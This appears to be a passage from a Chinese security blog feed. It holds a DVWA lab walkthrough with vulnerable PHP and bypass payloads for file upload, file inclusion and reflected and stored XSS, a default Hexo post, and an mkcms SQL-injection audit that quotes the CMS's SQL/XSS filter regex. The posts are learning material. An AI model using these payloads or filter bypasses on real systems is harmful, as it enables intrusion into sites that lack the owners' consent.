&amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//白名单验证文件后缀名必须为jpg、jpeg、png，且只验证最后一个.的后缀名，文件大小小于1000000	</span></span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">   </span><br><span class="line"><span class="comment">//此漏洞需结合文件包含来利用漏洞，上传一个图片马，用burp抓包，文件尾添加php代码,使用包含文件漏洞</span></span><br><span class="line">paylaod：</span><br><span class="line">   http:<span class="comment">//dvwa.com/vulnerabilities/fi/?page=file://C:/phpStudy/WWW/dvwa/hackable/uploads/z.png</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9guep3foj30yb0jxafk.jpg" alt="image-20200529175029137"></p>
<p>代码成功执行</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9gvtcfi1j31h30qlagv.jpg" alt="image-20200529175150370"></p>
<h3 id="0x04-文件包含漏洞"><a href="#0x04-文件包含漏洞" class="headerlink" title="0x04 文件包含漏洞"></a>0x04 文件包含漏洞</h3><h4 id="Low级别漏洞代码-3"><a href="#Low级别漏洞代码-3" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];&#x2F;&#x2F;通过GET方式访问本地文件并包含，如果开始远程包含，也可使用远程包含。</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf9vp45lixj31mr0u0dnq.jpg" alt="image-20200530022423028"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfafuw9txvj317r0u044r.jpg" alt="image-20200530140153305"></p>
<h4 id="Medium级别漏洞代码-3"><a href="#Medium级别漏洞代码-3" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;过滤http协议和..&#x2F; 、..\</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过方法，可以使用大小写、双写、file协议、...&#x2F;.&#x2F;，如果测试中获取到绝对路径，也可使用绝对路径来包含</span><br><span class="line">payload:</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;Http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;C:&#x2F;phpStudy&#x2F;WWW&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfagyb57asj314o0u0wk1.jpg" alt="image-20200530143948802"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfah4a370vj31870u07fd.jpg" alt="image-20200530144533014"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfah677hw0j312g0u0jyw.jpg" alt="image-20200530144723768"></p>
<h4 id="High级别漏洞代码-3"><a href="#High级别漏洞代码-3" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">&#x2F;&#x2F;只能使用file协议，并且file变量不等了include，此处直接包含其他文件即可</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">payload：</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;C:\phpStudy\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfahu1340kj310k0u045v.jpg" alt="image-20200530151017862"></p>
<h3 id="0x05-反射型XSS漏洞"><a href="#0x05-反射型XSS漏洞" class="headerlink" title="0x05 反射型XSS漏洞"></a>0x05 反射型XSS漏洞</h3><h4 id="Low级别漏洞"><a href="#Low级别漏洞" class="headerlink" title="Low级别漏洞"></a>Low级别漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">&#x2F;&#x2F;获取地址栏name的值，并且name不等于空</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    &#x2F;&#x2F;将地址栏内容输出</span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;由于未做任何过滤，直接弹出xss代码</span><br><span class="line">payload: &lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0bfn3zoj31my0ho75p.jpg" alt="image-20200531014947963"></p>
<h4 id="Medium级别漏洞代码-4"><a href="#Medium级别漏洞代码-4" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get input</span><br><span class="line">	&#x2F;&#x2F;此处过滤了&lt;script&gt;</span><br><span class="line">	$name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Feedback for end user</span><br><span class="line">	$html .&#x3D; &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过，使用大小写绕过、双写绕过或其他函数绕过</span><br><span class="line">payload:</span><br><span class="line">	&lt;body onload&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">	 &lt;input onfocus&#x3D;&quot;alert(&#39;1&#39;)&quot; autofocus&#x2F;&gt;</span><br><span class="line">	 &lt;sc&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">	 &lt;SCRIPT&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0h825hjj317o0hmwfj.jpg" alt="image-20200531015521665"></p>
<h4 id="High级别漏洞代码-4"><a href="#High级别漏洞代码-4" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get input</span><br><span class="line">	&#x2F;&#x2F;此处使用正则表达式对大小写，双写等做了过滤</span><br><span class="line">	$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Feedback for end user</span><br><span class="line">	$html .&#x3D; &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;绕过方法，使用其他函数绕过</span><br><span class="line">payload：</span><br><span class="line">	&lt;body onload&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">	 &lt;input onfocus&#x3D;&quot;alert(&#39;1&#39;)&quot; autofocus&#x2F;&gt;</span><br><span class="line">	 &lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0mh7j65j31gg0e20tz.jpg" alt="image-20200531020025026"></p>
<h3 id="0x06-存储型XSS漏洞"><a href="#0x06-存储型XSS漏洞" class="headerlink" title="0x06 存储型XSS漏洞"></a>0x06 存储型XSS漏洞</h3><h4 id="Low级别漏洞代码-4"><a href="#Low级别漏洞代码-4" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;<span class="comment">//判断post中的btnsign是否已设置</span></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );<span class="comment">//获取参数并移动字符串两端空白字符</span></span><br><span class="line">	$name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize message input</span></span><br><span class="line">	$message = stripslashes( $message );<span class="comment">//将转义的字符串去除，例如\'，去掉\</span></span><br><span class="line">    <span class="comment">//判断是否成功连接数据库，并且数据库返回的值是一个对象，是，就讲变量中的字符以合法的sql语句存入数据库</span></span><br><span class="line">	$message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize name input</span></span><br><span class="line">	$name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update database</span></span><br><span class="line">    <span class="comment">//此处直接拼接，且未对xss语句进行过滤导致存储型xss</span></span><br><span class="line">	$query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line">payload:&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0yr72qaj31ie0k00tu.jpg" alt="image-20200531021212990"></p>
<h4 id="Medium级别漏洞代码-5"><a href="#Medium级别漏洞代码-5" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="comment">//strip_tags 从字符串中剥离HTML和PHP标签，并使用addslashes转义</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="comment">//过滤script</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绕过方法，在审查元素中对name值进行修改，绕过name长度限制，使用大小写绕过</span></span><br><span class="line">payload:</span><br><span class="line">	&lt;SCRIPT&gt;alert(/time/)&lt;/script&gt;</span><br><span class="line">	&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb150iokrj31hs0hmn04.jpg" alt="image-20200531021813496"></p>
<h4 id="High级别漏洞代码-5"><a href="#High级别漏洞代码-5" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">	$name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize message input</span></span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="comment">//此处使用正则表达式对大小写，双写等做了过滤</span></span><br><span class="line">	$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">	$name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update database</span></span><br><span class="line">	$query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绕过方法，使用其他函数绕过</span></span><br><span class="line">payload：</span><br><span class="line">	&lt;body onload=<span class="string">"alert('xss')"</span>&gt;&lt;/body&gt;</span><br><span class="line">	 &lt;input onfocus=<span class="string">"alert('1')"</span> autofocus/&gt;</span><br><span class="line">	 &lt;img src=<span class="number">1</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb1a33u8dj31g10u0gr6.jpg" alt="image-20200531022306198"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>漏洞靶场，学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/05/31/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29807319&auto=1&height=66"></iframe>

<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>mkcms注入审计学习</title>
    <url>/2020/06/01/mkcms%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd5w8cgmtj30zk0m8109.jpg" alt="32"></p>
<a id="more"></a>

<h3 id="0x00-目标"><a href="#0x00-目标" class="headerlink" title="0x00 目标"></a>0x00 目标</h3><p>本次学习目标为找出mkcms的sql注入漏洞</p>
<h3 id="0x01-CMS目录说明"><a href="#0x01-CMS目录说明" class="headerlink" title="0x01 CMS目录说明"></a>0x01 CMS目录说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心目录</span><br><span class="line">admin	管理员目录</span><br><span class="line">data 	页面显示模板</span><br><span class="line">editor	kindeditor编辑器上传目录</span><br><span class="line">install	安装目录</span><br><span class="line">system	配置信息，数据库连接文件等</span><br><span class="line">ucenter	用户目录</span><br></pre></td></tr></table></figure>

<h3 id="0x02-审计工具使用"><a href="#0x02-审计工具使用" class="headerlink" title="0x02 审计工具使用"></a>0x02 审计工具使用</h3><p>对于新手来说，当然是先各种审计工具一把梭，用法师的审计工具对mkcms自动审计一波，扫出了不少漏洞。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd7yw1cjhj318r0u07c2.jpg" alt="image-20200601234539613"></p>
<h3 id="0x03-SQL注入漏洞"><a href="#0x03-SQL注入漏洞" class="headerlink" title="0x03 SQL注入漏洞"></a>0x03 SQL注入漏洞</h3><p>主题是挖sql注入，自然是先怼注入，第一个是后台管理员修改处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为了简洁，我删除了部分代码，留下漏洞代码,此漏洞存在admin/cms_admin_edit.php</span></span><br><span class="line">    $result = mysql_query(<span class="string">'select * from mkcms_manager where m_id = '</span>.$_GET[<span class="string">'id'</span>].<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">if</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line"><span class="comment">//此处代码未做过滤，直接拼接(当时没有看安全函数，直接就刚了)</span></span><br></pre></td></tr></table></figure>

<p>代码是这样的</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8ehyd4uj31490u07hi.jpg" alt="image-20200602000039646"></p>
<p>直接抓包做测试，使用审计工具中的mysql数据库监控工具，长这样子</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8hpfgjxj31hj0u0myz.jpg" alt="image-20200602000344692"></p>
<p>万事俱备，只差测试了，各种‘、“、and 1=1、 and 1=2测试，结果？？？</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8jr3kh7j317o0owmye.jpg" alt="image-20200602000542031"></p>
<p>作为新手慌得一批，感觉又是各种安全函数，过滤函数，正则过滤啥的。。所以直接上sqlmap跑一波验证一下，如果这个点跑不出来，直接就放了。。毕竟小白，不会像大佬各种绕过。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8m8f0ukj30vo0kagxx.jpg" alt="image-20200602000806115"></p>
<p>看见这个心放下了，说明没有找错，回去翻一下，发现system下有个safe.php，内容是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($StrFiltValue))&#123;</span><br><span class="line">		$StrFiltValue=implode($StrFiltValue);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"非法操作!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$postfilter);</span><br><span 